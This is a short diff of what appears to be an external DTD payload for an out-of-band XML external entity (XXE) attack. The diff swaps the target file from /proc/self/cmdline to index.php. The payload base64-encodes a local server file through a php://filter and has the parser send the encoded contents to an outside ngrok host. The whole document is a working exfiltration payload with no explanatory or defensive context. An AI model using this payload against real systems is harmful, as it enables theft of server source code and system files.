@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///proc/self/cmdline">
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://index.php">
 <!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://c6a6-77-32-28-228.ngrok.io/%file;'>">
 %eval;
 %test;
